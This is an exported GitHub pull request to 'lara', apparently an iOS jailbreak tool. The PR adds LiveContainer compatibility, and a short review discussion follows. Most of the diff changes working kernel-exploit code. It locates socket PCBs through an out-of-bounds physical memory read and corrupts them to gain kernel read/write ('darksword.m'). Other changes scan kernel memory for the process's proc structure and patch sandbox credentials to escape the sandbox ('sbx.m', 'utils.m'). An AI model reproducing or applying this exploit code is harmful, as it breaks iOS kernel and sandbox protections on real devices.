# feat: Add Livecontainer Support

> **Repository:** [rooootdev/lara](https://github.com/rooootdev/lara)  
> **Pull Request:** [#78](https://github.com/rooootdev/lara/pull/78)  
> **State:** 🟣 merged  
> **Branch:** `m1337v:main` → `rooootdev:main`  
> **Merged by:** [@rooootdev](https://github.com/rooootdev) on Apr 12, 2026  
> **Changes:** +386 / -87 across 16 files  
> **Created:** Apr 11, 2026  
> **Updated:** Apr 12, 2026  
> **Closed:** Apr 12, 2026  

---

## Description

*Opened by [@m1337v](https://github.com/m1337v)* *on Apr 11, 2026*


This PR adds stock LiveContainer compatibility to lara without changing the normal install flow.

The main fix is in the exploit/runtime path: instead of assuming a normal standalone app process, lara now handles rehosted execution by resolving the correct process identity from the guest executable path, the host executable, dyld-loaded LiveContainer images, and kernel-visible process names such as LiveProcess. Darksword and sandbox escape then use those alternate process markers when locating the current proc and PCB structures, which fixes the previous LiveContainer failure mode where kernel r/w succeeded but sandbox escape could not find the right process.

It also removes the old tweakloader-based LiveContainer detection. That check was unreliable because tweakloader injection is not enabled by default in stock LiveContainer, so using it as the primary detection signal caused false negatives. The new detection uses guest-path and dyld/host-process signals instead.

Finally, this drops the blanket “LiveContainer is unsupported” check and unneeded user-specific files (like .DS_Store and xcuserdata) were removed from version control, and .gitignore was updated so they do not come back.

*note: ipa for testing available in releases: https://github.com/m1337v/lara/releases/download/release/laralc.ipa*

## Changes in the Control Flow (Green)
<img width="1092" height="1059" alt="cf_updated" src="https://github.com/user-attachments/assets/59758918-5f77-4c57-82a6-60fe9822af94" />

## Screenshots (all in Livecontainer)
### Hybrid Mode
<img width="1179" height="2556" alt="IMG_4876" src="https://github.com/user-attachments/assets/436a5084-49ec-4e41-8d6b-72c27bf4f89b" />

### SBX Escape
<img width="1179" height="2556" alt="IMG_4877" src="https://github.com/user-attachments/assets/2590541c-5a81-433c-9a61-4820f7ee722a" />

### VFS Mode
<img width="1179" height="2556" alt="IMG_4878" src="https://github.com/user-attachments/assets/47ad6a35-2438-4f29-bc9c-c8d47f6194cc" />

### File Manager
<img width="1179" height="2556" alt="IMG_4875" src="https://github.com/user-attachments/assets/26aef422-011b-4dd3-87fb-b645e6444096" />


---

## Checks & Status

- Overall: 🟡 **pending**


---

## PR Commits (3)

- [`085a7f4`](https://github.com/rooootdev/lara/commit/085a7f44cfe9940848d72429507e02342da8f706) feat: add livecontainer support — *Morpheus* · Apr 11, 2026
- [`465fba8`](https://github.com/rooootdev/lara/commit/465fba8ce66acce87f337cf0a474c016e0169b3e) fix: improve control flow — *Morpheus* · Apr 11, 2026
- [`738c191`](https://github.com/rooootdev/lara/commit/738c191b73d1b155f77cb5ca299e9142c55bd9f9) fix: use LCAppInfo.plist for LC detection and procbypid(getpid()) for self proc resolution — *Morpheus* · Apr 12, 2026


---

## Changed Files (16)

- 🔴 `.DS_Store` (removed) — +0 / -0
- 🟢 `.gitignore` (added) — +4 / -0
  <details><summary>Diff</summary>

  ```diff
  @@ -0,0 +1,4 @@
+Resources/*
+xcuserdata/
+*.xcuserstate
+.DS_Store
\ No newline at end of file
  ```

  </details>
- 🟢 `lara.xcodeproj/.gitignore` (added) — +1 / -0
  <details><summary>Diff</summary>

  ```diff
  @@ -0,0 +1 @@
+xcuserdata/
\ No newline at end of file
  ```

  </details>
- 🔴 `lara.xcodeproj/project.xcworkspace/xcuserdata/ruter.xcuserdatad/UserInterfaceState.xcuserstate` (removed) — +0 / -0
- 🔴 `lara.xcodeproj/xcuserdata/ruter.xcuserdatad/xcdebugger/Breakpoints_v2.xcbkptlist` (removed) — +0 / -6
  <details><summary>Diff</summary>

  ```diff
  @@ -1,6 +0,0 @@
-<?xml version="1.0" encoding="UTF-8"?>
-<Bucket
-   uuid = "BBE8A810-2CB3-4A9E-958A-2D0CB72EE637"
-   type = "1"
-   version = "2.0">
-</Bucket>
  ```

  </details>
- 🔴 `lara.xcodeproj/xcuserdata/ruter.xcuserdatad/xcschemes/xcschememanagement.plist` (removed) — +0 / -19
  <details><summary>Diff</summary>

  ```diff
  @@ -1,19 +0,0 @@
-<?xml version="1.0" encoding="UTF-8"?>
-<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
-<plist version="1.0">
-<dict>
-	<key>SchemeUserState</key>
-	<dict>
-		<key>lara.xcscheme_^#shared#^_</key>
-		<dict>
-			<key>orderHint</key>
-			<integer>0</integer>
-		</dict>
-		<key>slieo.xcscheme_^#shared#^_</key>
-		<dict>
-			<key>orderHint</key>
-			<integer>1</integer>
-		</dict>
-	</dict>
-</dict>
-</plist>
  ```

  </details>
- 🔴 `lara/.DS_Store` (removed) — +0 / -0
- 🔴 `lara/assets/.DS_Store` (removed) — +0 / -0
- 🟡 `lara/funcs/islcinstalled.swift` (modified) — +5 / -29
  <details><summary>Diff</summary>

  ```diff
  @@ -6,37 +6,13 @@
 //
 
 import Foundation
-import MachO
 
 func islcinstalled() -> Bool {
-    // print("\nloaded images:")
-
-    var detected = false
-    let count = _dyld_image_count()
-
-    // print("image count: \(count)\n")
-
-    for i in 0..<count {
-        guard let cName = _dyld_get_image_name(i) else {
-            continue
-        }
-
-        let name = String(cString: cName)
-        let lower = name.lowercased()
-
-        let match =
-            lower.contains("tweakinjector.dylib") ||
-            lower.contains("tweakloader.dylib")
-
-        if match {
-            // print("[\(i)] \(name) <- aha!")
-            detected = true
-        } else {
-            // print("[\(i)] \(name)")
-        }
+    if Bundle.main.path(forResource: "LCAppInfo", ofType: "plist") != nil {
+        globallogger.log("\nlivecontainer detected: yeah (LCAppInfo.plist)")
+        return true
     }
 
-    globallogger.log("\nlivecontainer detected: \(detected ? "yeah" : "nah")")
-
-    return detected
+    globallogger.log("\nlivecontainer detected: nah")
+    return false
 }
  ```

  </details>
- 🟡 `lara/funcs/isunsupported.swift` (modified) — +0 / -4
  <details><summary>Diff</summary>

  ```diff
  @@ -49,9 +49,5 @@ func isunsupported() -> Bool {
         return true
     }
     
-    if islcinstalled() {
-        return true
-    }
-    
     return false
 }
  ```

  </details>
- 🟡 `lara/kexploit/darksword.m` (modified) — +167 / -25
  <details><summary>Diff</summary>

  ```diff
  @@ -15,6 +15,7 @@
 #include <stdbool.h>
 #include <stdarg.h>
 #include <string.h>
+#include <strings.h>
 #include <unistd.h>
 #include <fcntl.h>
 #include <errno.h>
@@ -26,8 +27,10 @@
 #include <netinet/in.h>
 #include <netinet/icmp6.h>
 #include <mach/mach.h>
+#include <mach/mach_error.h>
 #include <mach-o/dyld.h>
 #include <CoreFoundation/CoreFoundation.h>
+#include <limits.h>
 
 extern kern_return_t mach_vm_map(vm_map_t, mach_vm_address_t *, mach_vm_size_t,
     mach_vm_offset_t, int, mem_entry_name_port_t, memory_object_offset_t,
@@ -36,6 +39,12 @@ extern kern_return_t mach_vm_map(vm_map_t, mach_vm_address_t *, mach_vm_size_t,
 extern kern_return_t mach_vm_deallocate(vm_map_t, mach_vm_address_t, mach_vm_size_t);
 extern int  fileport_makeport(int fd, mach_port_t *port);
 extern int  fileport_makefd(mach_port_t port);
+extern int proc_name(int pid, void *buffer, uint32_t buffersize);
+extern int proc_pidpath(int pid, void *buffer, uint32_t buffersize);
+
+#ifndef PROC_PIDPATHINFO_MAXSIZE
+#define PROC_PIDPATHINFO_MAXSIZE (4 * PATH_MAX)
+#endif
 
 typedef struct __IOSurface *IOSurfaceRef;
 extern IOSurfaceRef IOSurfaceCreate(CFDictionaryRef properties);
@@ -109,6 +118,120 @@ static void cmp8_wait_for_change(volatile uint64_t *ptr, uint64_t old_val) {
 static volatile uint64_t *race_sync_ptr;
 
 static char *executable_name;
+static bool running_in_rehosted_process = false;
+static bool likely_livecontainer_guest = false;
+static bool livecontainer_bundle_detected = false;
+
+#define MAX_PROCESS_MARKERS 8
+#define PROCESS_MARKER_MAX_LEN 64
+static char process_markers[MAX_PROCESS_MARKERS][PROCESS_MARKER_MAX_LEN];
+static size_t process_marker_count = 0;
+static char guest_executable_name[PROCESS_MARKER_MAX_LEN];
+static char kernel_process_name[PROCESS_MARKER_MAX_LEN];
+static char host_executable_name[PROCESS_MARKER_MAX_LEN];
+
+static void add_process_marker(const char *marker) {
+    if (!marker || marker[0] == '\0') {
+        return;
+    }
+
+    size_t len = strnlen(marker, PROCESS_MARKER_MAX_LEN - 1);
+    if (len == 0) {
+        return;
+    }
+
+    for (size_t i = 0; i < process_marker_count; i++) {
+        if (strncmp(process_markers[i], marker, PROCESS_MARKER_MAX_LEN) == 0) {
+            return;
+        }
+    }
+
+    if (process_marker_count >= MAX_PROCESS_MARKERS) {
+        return;
+    }
+
+    memset(process_markers[process_marker_count], 0, PROCESS_MARKER_MAX_LEN);
+    memcpy(process_markers[process_marker_count], marker, len);
+    process_marker_count++;
+}
+
+static void add_process_marker_variants(const char *marker) {
+    add_process_marker(marker);
+
+    size_t len = strnlen(marker ?: "", PROCESS_MARKER_MAX_LEN - 1);
+    if (len > 15) {
+        char truncated[16] = {0};
+        memcpy(truncated, marker, 15);
+        add_process_marker(truncated);
+    }
+}
+
+static void initialize_process_markers(void) {
+    memset(guest_executable_name, 0, sizeof(guest_executable_name));
+    memset(kernel_process_name, 0, sizeof(kernel_process_name));
+    memset(host_executable_name, 0, sizeof(host_executable_name));
+    memset(process_markers, 0, sizeof(process_markers));
+    process_marker_count = 0;
+    running_in_rehosted_process = false;
+    likely_livecontainer_guest = false;
+    livecontainer_bundle_detected = is_likely_livecontainer_runtime();
+
+    char executable_path[PROC_PIDPATHINFO_MAXSIZE] = {0};
+    uint32_t length = sizeof(executable_path);
+    if (_NSGetExecutablePath(executable_path, &length) != 0) {
+        executable_path[0] = '\0';
+    }
+
+    const char *guest_name = executable_path[0] ? strrchr(executable_path, '/') : NULL;
+    guest_name = guest_name ? guest_name + 1 : executable_path;
+    if (guest_name && guest_name[0] != '\0') {
+        snprintf(guest_executable_name, sizeof(guest_executable_name), "%s", guest_name);
+        executable_name = guest_executable_name;
+    } else {
+        executable_name = NULL;
+    }
+
+    char host_executable_path[PROC_PIDPATHINFO_MAXSIZE] = {0};
+    if (proc_pidpath(getpid(), host_executable_path, sizeof(host_executable_path)) > 0) {
+        const char *host_name = strrchr(host_executable_path, '/');
+        host_name = host_name ? host_name + 1 : host_executable_path;
+        if (host_name && host_name[0] != '\0') {
+            snprintf(host_executable_name, sizeof(host_executable_name), "%s", host_name);
+        }
+    }
+
+    int proc_name_length = proc_name(getpid(), kernel_process_name, sizeof(kernel_process_name));
+    if (proc_name_length <= 0) {
+        kernel_process_name[0] = '\0';
+    }
+
+    likely_livecontainer_guest = livecontainer_bundle_detected;
+    running_in_rehosted_process = likely_livecontainer_guest;
+
+    if (running_in_rehosted_process) {
+        if (likely_livecontainer_guest) {
+            add_process_marker_variants("LiveProcess");
+        }
+        add_process_marker_variants(kernel_process_name);
+        add_process_marker_variants(host_executable_name);
+        add_process_marker_variants(guest_executable_name);
+    } else {
+        add_process_marker_variants(guest_executable_name);
+        add_process_marker_variants(kernel_process_name);
+    }
+
+    pe_log("executable_path: %s", executable_path[0] ? executable_path : "(unknown)");
+    pe_log("host_executable_path: %s", host_executable_path[0] ? host_executable_path : "(unknown)");
+    pe_log("guest_executable_name: %s", guest_executable_name[0] ? guest_executable_name : "(unknown)");
+    pe_log("host_executable_name: %s", host_executable_name[0] ? host_executable_name : "(unknown)");
+    pe_log("kernel_process_name: %s", kernel_process_name[0] ? kernel_process_name : "(unknown)");
+    pe_log("livecontainer_bundle: %s", livecontainer_bundle_detected ? "yes" : "no");
+    pe_log("livecontainer_guest: %s", likely_livecontainer_guest ? "yes" : "no");
+    pe_log("rehosted_process: %s", running_in_rehosted_process ? "yes" : "no");
+    for (size_t i = 0; i < process_marker_count; i++) {
+        pe_log("process_marker[%zu]: %s", i, process_markers[i]);
+    }
+}
 
 static int control_socket;
 static int rw_socket;
@@ -165,6 +288,10 @@ static void cmp8_wait_for_change(volatile uint64_t *ptr, uint64_t old_val) {
 
         mach_port_t target_object        = (mach_port_t)*target_object_sync_ptr;
         uint64_t    target_object_offset = *target_object_offset_sync_ptr;
+        if (target_object == MACH_PORT_NULL || ft == 0 || ft_size == 0) {
+            uwrite64((uint64_t)race_sync_ptr, 0);
+            continue;
+        }
 
         mach_vm_address_t addr = ft;
         kern_return_t kr = mach_vm_map(
@@ -174,8 +301,9 @@ static void cmp8_wait_for_change(volatile uint64_t *ptr, uint64_t old_val) {
             FALSE, VM_PROT_DEFAULT, VM_PROT_DEFAULT, VM_INHERIT_NONE);
 
         if (kr != KERN_SUCCESS) {
-            pe_log("mach_vm_map failed in free_thread!");
-            pe_log("    free_target: 0x%llx, target_object: 0x%x", ft, target_object);
+            pe_log("mach_vm_map failed in free_thread! kr=%d (%s)", kr, mach_error_string(kr));
+            pe_log("    free_target: 0x%llx, target_size: 0x%llx, target_object: 0x%x, target_offset: 0x%llx",
+                   ft, ft_size, target_object, target_object_offset);
         }
 
         uwrite64((uint64_t)race_sync_ptr, 0);
@@ -483,27 +611,48 @@ static int64_t find_and_corrupt_socket(mach_port_t memory_object, uint64_t seeki
         physical_oob_read_mo_with_retry(memory_object, seeking_offset,
                                          oob_size, oob_offset, read_buffer);
 
-    uint64_t search_start_idx = 0;
     bool target_found = false;
     uint64_t pcb_start_offset = 0;
     uint64_t icmp6filt_offset = 0x148;
-    void *found = NULL;
-
-    do {
-        found = memmem((uint8_t *)read_buffer + search_start_idx,
-                        oob_size - search_start_idx,
-                        executable_name, strlen(executable_name));
-        if (found) {
-            pcb_start_offset = ((uint64_t)((uint8_t *)found - (uint8_t *)read_buffer)) & 0xFFFFFFFFFFFFFC00ULL;
-            if (*(uint64_t *)((uint8_t *)read_buffer + pcb_start_offset + icmp6filt_offset + 8) == 0x0000ffffffffffffULL) {
-                target_found = true;
-                break;
+    const char *matched_marker = NULL;
+
+    for (uint64_t search_start_idx = 0; search_start_idx < oob_size; search_start_idx += 0x400) {
+        void *best_found = NULL;
+        const char *best_marker = NULL;
+
+        for (size_t marker_idx = 0; marker_idx < process_marker_count; marker_idx++) {
+            const char *marker = process_markers[marker_idx];
+            size_t marker_length = strnlen(marker, PROCESS_MARKER_MAX_LEN);
+            if (marker_length == 0) {
+                continue;
             }
+
+            void *candidate = memmem((uint8_t *)read_buffer + search_start_idx,
+                                     oob_size - search_start_idx,
+                                     marker,
+                                     marker_length);
+            if (candidate && (!best_found || candidate < best_found)) {
+                best_found = candidate;
+                best_marker = marker;
+            }
+        }
+
+        if (!best_found) {
+            break;
+        }
+
+        pcb_start_offset = ((uint64_t)((uint8_t *)best_found - (uint8_t *)read_buffer)) & 0xFFFFFFFFFFFFFC00ULL;
+        if (*(uint64_t *)((uint8_t *)read_buffer + pcb_start_offset + icmp6filt_offset + 8) == 0x0000ffffffffffffULL) {
+            matched_marker = best_marker;
+            target_found = true;
+            break;
         }
-        search_start_idx += 0x400;
-    } while (found && search_start_idx < oob_size);
+    }
 
     if (target_found) {
+        if (matched_marker) {
+            pe_log("Matched PCB via process marker: %s", matched_marker);
+        }
         pe_log("pcb_start_offset: 0x%llx", pcb_start_offset);
         uint64_t target_inp_gencnt = *(uint64_t *)((uint8_t *)read_buffer + pcb_start_offset + 0x78);
         pe_log("target_inp_gencnt: 0x%llx", target_inp_gencnt);
@@ -614,15 +763,8 @@ static void krw_sockets_leak_forever(void) {
 static void pe_init(void) {
     init_target_file();
 
-    if (!executable_name) {
-        uint32_t length = 0x1024;
-        char *executable_path = calloc(1, length);
-        _NSGetExecutablePath(executable_path, &length);
-        executable_name = strrchr(executable_path, '/');
-        if (executable_name) executable_name++;
-        else executable_name = executable_path;
-    }
-    pe_log("executable_name: %s", executable_name);
+    initialize_process_markers();
+    pe_log("executable_name: %s", executable_name ?: "(unknown)");
 
     uint8_t *free_thread_arg = calloc(1, PAGE_SZ);
     pe_log("free_thread_arg: %p", free_thread_arg);
  ```

  </details>
- 🟡 `lara/kexploit/pe/sbx.m` (modified) — +13 / -2
  <details><summary>Diff</summary>

  ```diff
  @@ -12,6 +12,7 @@
 #include <dlfcn.h>
 #include <string.h>
 #include <stdarg.h>
+#include <limits.h>
 #include <sys/sysctl.h>
 #include <mach/machine.h>
 
@@ -42,6 +43,7 @@ static void sbx_log(const char *fmt, ...) {
 #define KRW_LEN 0x20
 
 #define OFF_PROC_PROC_RO       0x18
+#define OFF_PROC_COMM          0x56c
 #define OFF_PROC_RO_UCRED      0x20
 #define OFF_UCRED_CR_LABEL     0x78
 #define OFF_LABEL_SANDBOX      0x10
@@ -200,8 +202,17 @@ uint64_t sbx_ucredbyproc(uint64_t proc) {
     return ucred;
 }
 
-int sbx_escape(uint64_t ourproc) {
-    uint64_t ucred = sbx_ucredbyproc(ourproc);
+int sbx_escape(uint64_t self_proc) {
+    if (!self_proc) {
+        sbx_log("ds_get_our_proc() returned 0x0 — trying ourproc() fallback...");
+        self_proc = ourproc();
+    }
+
+    if (!self_proc) {
+        sbx_log("ourproc() failed after PID/socket-based self-proc recovery");
+    }
+
+    uint64_t ucred = sbx_ucredbyproc(self_proc);
     if (!ucred) {
         sbx_log("failed to obtain ucred");
         return -1;
  ```

  </details>
- 🟡 `lara/kexploit/utils.h` (modified) — +1 / -0
  <details><summary>Diff</summary>

  ```diff
  @@ -22,6 +22,7 @@ uint64_t getprocsize(void);
 uint64_t ourproc(void);
 uint64_t taskbyproc(uint64_t procaddr);
 uint64_t procbyname(const char *procname);
+bool is_likely_livecontainer_runtime(void);
 
 typedef struct {
     uint32_t pid;
  ```

  </details>
- 🟡 `lara/kexploit/utils.m` (modified) — +194 / -1
  <details><summary>Diff</summary>

  ```diff
  @@ -13,10 +13,18 @@
 #import <unistd.h>
 #import <string.h>
 #import <sys/types.h>
+#import <mach-o/dyld.h>
+#import <limits.h>
 #include <sys/sysctl.h>
 #include <stdint.h>
 #include <stdbool.h>
 
+extern int proc_name(int pid, void *buffer, uint32_t buffersize);
+
+#ifndef PROC_PIDPATHINFO_MAXSIZE
+#define PROC_PIDPATHINFO_MAXSIZE (4 * PATH_MAX)
+#endif
+
 #define P_DISABLE_ASLR 0x00001000
 
 uint32_t PROC_PID_OFFSET;                           // p_pid
@@ -124,6 +132,13 @@ static inline uint64_t xpaci(uint64_t a) {
     return x0;
 }
 
+static inline uint64_t signptr(uint64_t v) {
+    if ((v >> 32) > 0xFFFF) return v | 0xFFFFFF8000000000ULL;
+    return v;
+}
+
+#define S(x) ({ uint64_t _v = xpaci(x); signptr(_v); })
+
 static uint64_t loadkernproc(void) {
     NSNumber *n = [[NSUserDefaults standardUserDefaults] objectForKey:kkernprocoffset];
     if (!n) return 0;
@@ -140,6 +155,155 @@ static uint64_t kernprocaddress(void) {
     return 0xfffffff0079fd9c8 + kernslide;
 }
 
+bool is_likely_livecontainer_runtime(void) {
+    static int cached_result = -1;
+    if (cached_result != -1) {
+        return cached_result == 1;
+    }
+
+    NSString *appInfoPath = [[NSBundle mainBundle] pathForResource:@"LCAppInfo" ofType:@"plist"];
+    cached_result = appInfoPath != nil ? 1 : 0;
+    return cached_result == 1;
+}
+
+static size_t current_process_name_candidates(char names[][64], size_t max_count) {
+    size_t count = 0;
+
+    char host_name[64] = {0};
+    if (proc_name(getpid(), host_name, sizeof(host_name)) > 0 && host_name[0] != '\0') {
+        snprintf(names[count], sizeof(names[count]), "%s", host_name);
+        count++;
+    }
+
+    if (count < max_count) {
+        char executable_path[PROC_PIDPATHINFO_MAXSIZE] = {0};
+        uint32_t length = sizeof(executable_path);
+        if (_NSGetExecutablePath(executable_path, &length) == 0) {
+            const char *guest_name = strrchr(executable_path, '/');
+            guest_name = guest_name ? guest_name + 1 : executable_path;
+            if (guest_name && guest_name[0] != '\0') {
+                bool duplicate = false;
+                for (size_t i = 0; i < count; i++) {
+                    if (strncmp(names[i], guest_name, sizeof(names[i])) == 0) {
+                        duplicate = true;
+                        break;
+                    }
+                }
+                if (!duplicate) {
+                    snprintf(names[count], sizeof(names[count]), "%s", guest_name);
+                    count++;
+                }
+            }
+        }
+    }
+
+    return count;
+}
+
+static uint64_t check_proc_at_for_pid(uint64_t candidate, pid_t pid, const char *src, uint32_t off) {
+    if (!is_kptr(candidate)) {
+        return 0;
+    }
+
+    uint32_t pid_offsets[2] = { PROC_PID_OFFSET, PROC_PID_OFFSET == 0x60 ? 0x28 : 0x60 };
+    for (size_t i = 0; i < 2; i++) {
+        uint32_t current_pid = ds_kread32(candidate + pid_offsets[i]);
+        if (current_pid == (uint32_t)pid) {
+            printf("(utils) found self proc via %s+0x%x -> 0x%llx pid=%d (pidoff=0x%x)\n",
+                   src, off, candidate, current_pid, pid_offsets[i]);
+            return candidate;
+        }
+    }
+
+    return 0;
+}
+
+static uint64_t find_self_proc_via_socket(void) {
+    uint64_t rw_pcb = ds_get_rw_socket_pcb();
+    if (!is_kptr(rw_pcb)) {
+        printf("(utils) rw_socket_pcb invalid: 0x%llx\n", rw_pcb);
+        return 0;
+    }
+
+    pid_t ourpid = getpid();
+    printf("(utils) socket fallback: pcb=0x%llx pid=%d\n", rw_pcb, ourpid);
+
+    uint8_t pcbbuf[0x200];
+    ds_kread(rw_pcb, pcbbuf, sizeof(pcbbuf));
+    for (uint32_t off = 0; off < sizeof(pcbbuf); off += 8) {
+        uint64_t candidate = S(*(uint64_t *)(pcbbuf + off));
+        uint64_t proc = check_proc_at_for_pid(candidate, ourpid, "pcb", off);
+        if (proc != 0) {
+            return proc;
+        }
+    }
+
+    uint64_t sock = 0;
+    for (uint32_t sock_offset = 0x10; sock_offset <= 0x50; sock_offset += 0x08) {
+        uint64_t candidate = S(ds_kread64(rw_pcb + sock_offset));
+        if (!is_kptr(candidate)) {
+            continue;
+        }
+
+        for (uint32_t backptr_offset = 0; backptr_offset <= 0x30; backptr_offset += 0x08) {
+            uint64_t backptr = S(ds_kread64(candidate + backptr_offset));
+            if (backptr == rw_pcb) {
+                sock = candidate;
+                printf("(utils) socket found via pcb+0x%x = 0x%llx (backptr at +0x%x)\n",
+                       sock_offset, sock, backptr_offset);
+                break;
+            }
+        }
+
+        if (sock != 0) {
+            break;
+        }
+    }
+
+    if (!sock) {
+        uint64_t candidate = S(ds_kread64(rw_pcb + 0x40));
+        if (is_kptr(candidate)) {
+            sock = candidate;
+            printf("(utils) socket via fixed pcb+0x40 = 0x%llx\n", sock);
+        }
+    }
+
+    if (!is_kptr(sock)) {
+        printf("(utils) socket scan found nothing (pcb=0x%llx sock=0x%llx)\n", rw_pcb, sock);
+        return 0;
+    }
+
+    uint8_t sockbuf[0x300];
+    ds_kread(sock, sockbuf, sizeof(sockbuf));
+    for (uint32_t off = 0; off < sizeof(sockbuf); off += 8) {
+        uint64_t candidate = S(*(uint64_t *)(sockbuf + off));
+        uint64_t proc = check_proc_at_for_pid(candidate, ourpid, "sock", off);
+        if (proc != 0) {
+            return proc;
+        }
+    }
+
+    for (uint32_t off = 0; off < sizeof(sockbuf); off += 8) {
+        uint64_t pointer = S(*(uint64_t *)(sockbuf + off));
+        if (!is_kptr(pointer)) {
+            continue;
+        }
+
+        uint8_t inner[0x100];
+        ds_kread(pointer, inner, sizeof(inner));
+        for (uint32_t inner_offset = 0; inner_offset < sizeof(inner); inner_offset += 8) {
+            uint64_t candidate = S(*(uint64_t *)(inner + inner_offset));
+            uint64_t proc = check_proc_at_for_pid(candidate, ourpid, "sock->ptr", off);
+            if (proc != 0) {
+                return proc;
+            }
+        }
+    }
+
+    printf("(utils) socket scan found nothing (pcb=0x%llx sock=0x%llx)\n", rw_pcb, sock);
+    return 0;
+}
+
 uint64_t procbypid(pid_t targetpid) {
     if (!ds_is_ready()) {
         printf("(utils) darksword not ready\n");
@@ -200,7 +364,36 @@ uint64_t procbypid(pid_t targetpid) {
 }
 
 uint64_t ourproc(void) {
-    return procbypid(getpid());
+    uint64_t proc = procbypid(getpid());
+    if (proc != 0) {
+        return proc;
+    }
+
+    proc = find_self_proc_via_socket();
+    if (proc != 0) {
+        return proc;
+    }
+
+    if (is_likely_livecontainer_runtime()) {
+        printf("(utils) LiveContainer self-proc lookup exhausted pid-based methods\n");
+        return 0;
+    }
+
+    char names[3][64] = {{0}};
+    size_t count = current_process_name_candidates(names, 3);
+    for (size_t i = 0; i < count; i++) {
+        if (names[i][0] == '\0') {
+            continue;
+        }
+
+        printf("(utils) trying procbyname fallback: %s\n", names[i]);
+        proc = procbyname(names[i]);
+        if (proc != 0) {
+            return proc;
+        }
+    }
+
+    return 0;
 }
 
 uint64_t taskbyproc(uint64_t procaddr) {
  ```

  </details>
- 🟡 `lara/lara.swift` (modified) — +1 / -1
  <details><summary>Diff</summary>

  ```diff
  @@ -91,7 +91,7 @@ struct lara: App {
                 }
             }
             .alert(isPresented: $showunsupported) {
-                .init(title: Text("Unsupported"), message: Text("Lara is currently not supported on this device. Possible reasons:\nYour device is newer than iOS 26.0.1\nYour device is older than iOS 17.0\nYour device has MIE\nYou installed lara via LiveContainer\n\nLara will probably not work."))
+                .init(title: Text("Unsupported"), message: Text("Lara is currently not supported on this device. Possible reasons:\nYour device is newer than iOS 26.0.1\nYour device is older than iOS 17.0\nYour device has MIE\n\nLara will probably not work."))
             }
         }
     }
  ```

  </details>
- 🔴 `lara/other/media.xcassets/.DS_Store` (removed) — +0 / -0


---

## References

### Commits (1)

- [c1610f7](https://github.com/danosito/lara-m-chips-fix/commit/c1610f7b77aeaaf93c50301e341f847c78d40d1d) — Merge pull request #78 from m1337v/main


---

## Timeline (Verbose)

- : 📝 Commit 085a7f4: feat: add livecontainer support
- : 📝 Commit 465fba8: fix: improve control flow
- : 📝 Commit 738c191: fix: use LCAppInfo.plist for LC detection and procbypid(getpid()) for self proc resolution
- Apr 12, 2026: 🟣 @rooootdev merged
- Apr 12, 2026: 🔴 Closed by @rooootdev
- Apr 19, 2026: 🔗 Commit c1610f7 — Merge pull request #78 from m1337v/main


---

## Comments (3)

### Comment #1 — [@khanhduytran0](https://github.com/khanhduytran0) · Apr 12, 2026

`ID: 4230889827`


Hi, LiveContainer dev here. I planned to add LiveContainer checks alongside with RemoteCall-based tweaks once it’s added. Thanks for early support. However, this could have been done cleaner.

- LiveContainer detection can be simplified to just check for the presence of `LCAppInfo.plist` in the app bundle.

- You should consider using [LiveContainer’s builtin API](https://github.com/LiveContainer/LiveContainer/blob/0e5bbfe586ba6dfba81d0e0e03fb323fb55bcdfd/TweakLoader/utils.h#L7-L21) if need. Copy the headers and use it directly. (be sure to check for LC beforehand OR use `respondsToSelector:`)

Also I’d say avoid getting self proc by name, and instead fix self proc by getpid, since if there are multiple LiveProcesses running, it might accidentally get the proc of another LiveProcess.


👍 1


---

### Comment #2 — [@m1337v](https://github.com/m1337v) · Apr 12, 2026

`ID: 4231058407`


Thank you for the review and suggested improvements. You're right, it's way cleaner that way. Added them and noticed it runs faster too.


---

### Comment #3 — [@rooootdev](https://github.com/rooootdev) · Apr 12, 2026

`ID: 4231953195`


this works very well! awesome!


❤️ 1


---

*Exported on 10/14/2026, 2:52:32 PM from [https://github.com/rooootdev/lara/pull/78](https://github.com/rooootdev/lara/pull/78)*
